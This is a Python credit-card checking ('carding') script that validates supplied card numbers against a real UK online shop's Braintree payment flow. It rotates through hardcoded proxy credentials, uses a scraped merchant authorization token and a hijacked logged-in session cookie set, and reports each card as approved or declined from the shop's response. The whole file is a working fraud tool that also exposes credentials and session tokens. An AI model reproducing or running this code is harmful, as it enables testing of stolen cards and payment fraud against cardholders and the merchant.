def chk(cc, mm, yy, cvv):
    import requests, random, checkeproxy
    from bs4 import BeautifulSoup

    all_proxi = ["zmvfzmnv-rotate:glwpyl3isz1e@p.webshare.io:80", "nmligtxr-rotate:hhs3zjsbp1at@p.webshare.io:80",
"qccgfsln-rotate:xa2z8m66jb15@p.webshare.io:80",
"ktpovvnk-rotate:7b4yy9hbhmv7@p.webshare.io:80",
"nmligtxr-rotate:hhs3zjsbp1at@p.webshare.io:80",
"jgncwcx-rotate:fara9drhm09k@p.webshare.io:80"]
    
    proxy = random.choice(all_proxi)
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    }
    status_proxy = checkeproxy.chk_proxy(proxy=proxy)
    if status_proxy:
        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQyNjkyNjMsImp0aSI6IjA4N2RkMDYwLTc5NmQtNGEyMy1iMzg4LWY1MWVjNzFkZDZmZCIsInN1YiI6InZzcDJ2eWhnM2NqZnd0N3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZzcDJ2eWhnM2NqZnd0N3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRhbmllbHNvdXRoZXJuZm91cmRvdGNvdWsifX0.OKuma6kK9mfoki1Fms_48-NhUyg3_iZWDS-keypKeYWCiUMRoBcrmz4wOPhSkvu-9CgA9jQx3FIl1Ygp0jtERw',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '2999a02d-fbd2-443e-9d59-1c860488a651',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '10009',
                            'streetAddress': 'centro ee12',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies)
        tokencc = response.json()["data"]["tokenizeCreditCard"]["token"]

        import requests

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.cutplasticsheeting.co.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.cutplasticsheeting.co.uk/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        }
    #b45b1894-ede5-4dcf-98d7-2478daac197d --- 6191f6db-6286-4f33-b9f8-101bc6be7891
        json_data = {
            'amount': '0.00',
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'es-419',
            'browserScreenHeight': 768,
            'browserScreenWidth': 1366,
            'browserTimeZone': 300,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'ipAddress': '45.132.159.174',
                'billingLine1': 'centro 12',
                'billingLine2': '',
                'billingCity': 'ny',
                'billingState': 'NY',
                'billingPostalCode': '10080',
                'billingCountryCode': 'US',
                'billingPhoneNumber': '3214323345',
                'billingGivenName': 'sefsef',
                'billingSurname': 'sefsef',
                'email': 'efsfesefsef@gmail.com',
            },
            'challengeRequested': True,
            'bin': '544679',
            'dfReferenceId': '0_45e69ee2-9799-489d-9583-bb88c392e4a0',
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.106.0',
                'cardinalDeviceDataCollectionTimeElapsed': 1234,
                'issuerDeviceDataCollectionTimeElapsed': 886,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQyNjkyNjMsImp0aSI6IjA4N2RkMDYwLTc5NmQtNGEyMy1iMzg4LWY1MWVjNzFkZDZmZCIsInN1YiI6InZzcDJ2eWhnM2NqZnd0N3ciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InZzcDJ2eWhnM2NqZnd0N3ciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImRhbmllbHNvdXRoZXJuZm91cmRvdGNvdWsifX0.OKuma6kK9mfoki1Fms_48-NhUyg3_iZWDS-keypKeYWCiUMRoBcrmz4wOPhSkvu-9CgA9jQx3FIl1Ygp0jtERw',
            'braintreeLibraryVersion': 'braintree/web/3.106.0',
            '_meta': {
                'merchantAppId': 'www.cutplasticsheeting.co.uk',
                'platform': 'web',
                'sdkVersion': '3.106.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': '2999a02d-fbd2-443e-9d59-1c860488a651',
            },
        }

        response = requests.post(
            f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup',
            headers=headers,
            json=json_data, proxies=proxies
        )
        try:
            noncecard = response.json()["paymentMethod"]["nonce"]

            import requests

            cookies = {
        'CookieConsent': '{stamp:%270OLNY3boDItFQsQBkwq90dENWIU/34eDuf9tcwYotR8tbTGmg1Ov8Q==%27%2Cnecessary:true%2Cpreferences:false%2Cstatistics:false%2Cmarketing:false%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1734180275261%2Cregion:%27us-06%27}',
        'store_notice952c7ae31b73daad44f5070c1f6b820a': 'hidden',
        'mailchimp_landing_site': 'https%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F',
        'racart': 'dedd0a8c-b7e8-4a15-bde2-0f2e6e4c0412',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-12-14%2012%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2F',
        'sbjs_first_add': 'fd%3D2024-12-14%2012%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36%20OPR%2F114.0.0.0',
        'messagesUtk': '8adfa1b4b9854b9ca2aada4aa41e3e6a',
        'mailchimp.cart.current_email': 'sefsefse@gmail.com',
        'mailchimp_user_email': 'sefsefse%40gmail.com',
        '_lscache_vary': '7338de4f718902b9944fac981fea3b7d',
        'wordpress_logged_in_25d1e4cc65a01cc19c5e4bd4187ef9d3': 'sefsefse%7C1735389998%7CDFgVB5uauGhOSFEHCK9Ca0k3JhTBkOUymW7e0uUw24I%7Cddb7ecabdfef913c996fd367867af3d833e87f65aaf48b66f3105ca350c2fd8e',
        'wfwaf-authcookie-c76ef5c87d3f9406d0566fe8010d4383': '4354%7Cother%7Cread%7Cd5257211cf914aba97ff0893284da5db65511228c8cf6642bbf61daef9b450f7',
        '_gcl_au': '1.1.243993949.1734181341',
        'hs-messages-hide-welcome-message': 'true',
        'cf_clearance': '.cPBAnXryRMjLUZu8YPTRf1Cr94Mc1LMPTHHU07seGE-1734182572-1.2.1.1-aMHz4wcqfwyG0GDPzr54yzjtARO49K94d_yZnNhqcE1QLxrarp7Ps7kFkA4x6KJvEPgMCLNFt9WempU1Eufw93L4mEu6aWvUAfDU7mqmuae14leky06QbQnPwj28HVXLudiHNTt597ti6R0vq9a6owySm9mFrLQ82ZD6jTW5_.voc2t9yHSIlrnK.OY0gBoTCzeQilNaT2WETHHKGjIS6hCKB.MghrIxfQDehUj7xJSMrftB1EbKaOGMnF8Cn7L_JwLynlq4ehPhOXlg8zUrpL.cSCoBChCWn0lAy5XdV2RlCqjL6eoGZDbg7Ml5LF0zSxJ9iNiMmrNoYRQb.rTnt1p4Hv4KK_tNo8FfQUE5FrnccK2SU07HuStYRhs5dfFzp4PB.K9jLbt52Gq8wFplEQ',
        'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2Fadd-payment-method%2F',
    }

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'CookieConsent={stamp:%270OLNY3boDItFQsQBkwq90dENWIU/34eDuf9tcwYotR8tbTGmg1Ov8Q==%27%2Cnecessary:true%2Cpreferences:false%2Cstatistics:false%2Cmarketing:false%2Cmethod:%27explicit%27%2Cver:1%2Cutc:1734180275261%2Cregion:%27us-06%27}; store_notice952c7ae31b73daad44f5070c1f6b820a=hidden; mailchimp_landing_site=https%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F; racart=dedd0a8c-b7e8-4a15-bde2-0f2e6e4c0412; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-14%2012%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2F; sbjs_first_add=fd%3D2024-12-14%2012%3A45%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Safari%2F537.36%20OPR%2F114.0.0.0; messagesUtk=8adfa1b4b9854b9ca2aada4aa41e3e6a; mailchimp.cart.current_email=sefsefse@gmail.com; mailchimp_user_email=sefsefse%40gmail.com; _lscache_vary=7338de4f718902b9944fac981fea3b7d; wordpress_logged_in_25d1e4cc65a01cc19c5e4bd4187ef9d3=sefsefse%7C1735389998%7CDFgVB5uauGhOSFEHCK9Ca0k3JhTBkOUymW7e0uUw24I%7Cddb7ecabdfef913c996fd367867af3d833e87f65aaf48b66f3105ca350c2fd8e; wfwaf-authcookie-c76ef5c87d3f9406d0566fe8010d4383=4354%7Cother%7Cread%7Cd5257211cf914aba97ff0893284da5db65511228c8cf6642bbf61daef9b450f7; _gcl_au=1.1.243993949.1734181341; hs-messages-hide-welcome-message=true; cf_clearance=.cPBAnXryRMjLUZu8YPTRf1Cr94Mc1LMPTHHU07seGE-1734182572-1.2.1.1-aMHz4wcqfwyG0GDPzr54yzjtARO49K94d_yZnNhqcE1QLxrarp7Ps7kFkA4x6KJvEPgMCLNFt9WempU1Eufw93L4mEu6aWvUAfDU7mqmuae14leky06QbQnPwj28HVXLudiHNTt597ti6R0vq9a6owySm9mFrLQ82ZD6jTW5_.voc2t9yHSIlrnK.OY0gBoTCzeQilNaT2WETHHKGjIS6hCKB.MghrIxfQDehUj7xJSMrftB1EbKaOGMnF8Cn7L_JwLynlq4ehPhOXlg8zUrpL.cSCoBChCWn0lAy5XdV2RlCqjL6eoGZDbg7Ml5LF0zSxJ9iNiMmrNoYRQb.rTnt1p4Hv4KK_tNo8FfQUE5FrnccK2SU07HuStYRhs5dfFzp4PB.K9jLbt52Gq8wFplEQ; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cutplasticsheeting.co.uk%2Faccount%2Fadd-payment-method%2F',
                'origin': 'https://www.cutplasticsheeting.co.uk',
                'priority': 'u=0, i',
                'referer': 'https://www.cutplasticsheeting.co.uk/account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
            }

            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': noncecard,
                'braintree_cc_device_data': '{"device_session_id":"12cbda307b811c6260f3f02cdbd13333","fraud_merchant_id":null,"correlation_id":"2999a02d-fbd2-443e-9d59-1c860488"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vsp2vyhg3cjfwt7w/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/vsp2vyhg3cjfwt7w"},"merchantId":"vsp2vyhg3cjfwt7w","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5NTkzYWUwZC1mOGIyLTQ2ZDctYmY4ZC1mNjFkNjM5YzU3NDEiLCJpYXQiOjE3MzQxODI4NzAsImV4cCI6MTczNDE5MDA3MCwiaXNzIjoiNjMzNzg5NzIxNWNlYjM1MmUyN2ZlYmU2IiwiT3JnVW5pdElkIjoiNjMzNzg5NzFiYmFiYjU0Zjk0YzU1ZjdmIn0.h-iwJZ0W55bjXFciMSOc0KqFRlpcxJQaIoPUuf4lhlY"},"paypalEnabled":true,"paypal":{"displayName":"Fourdot","clientId":"AVAG_gBZtLBYDnnpjZdOOK76VmIfeqgg2vcwOEb4CJXaaKZNYBPz3YG2KTnSh1_1Bkq8jM7oqQ1L9yOG","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"danielsouthernfourdotcouk","payeeEmail":null,"currencyIsoCode":"GBP"}}',
                'woocommerce-add-payment-method-nonce': '864ff6c307',
                '_wp_http_referer': '/account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }
            try:
                response = requests.post(
                    'https://www.cutplasticsheeting.co.uk/account/add-payment-method/',
                    cookies=cookies,
                    headers=headers,
                    data=data, proxies=proxies
                )
                #file = open("output.html", "w", encoding="utf-8").write(response.text)
                soup = BeautifulSoup(response.text, "html.parser")
                ul = soup.find("ul", class_="woocommerce-error")
                status = "Decline❌"
                if ul:
                    li = ul.get_text(strip=True)
                    if li == "There was an error saving your payment method. Reason: Card Issuer Declined CVV":
                        status = "Approed CCN✅"
                    res_card = li
                else:
                    soup2 = BeautifulSoup(response.text, "html.parser")
                    message_div = soup2.find("div", "woocommerce-MyAccount-content")
                    if message_div:
                        messaged = message_div.find("div", class_="woocommerce-message")
                        if messaged:
                            message = messaged.get_text(strip=True)
                            if message == "Payment method successfully added.":
                                status = "Approved✅"
                                
                            res_card = message
                        else:
                            
                            status = "Error"
                            res_card = "Error in the 4 process"
                    else:
                        status = "Error"
                        res_card = "Error in the 3 process"        
            except:
                status = "Error"
                res_card = "Error in the 2 process"
            
        except:
            status = "Error"
            res_card = "Error in the 1 process"
        
        return[res_card, status]
    else:
        return["Reason:Decline Proxy", "No checked"]

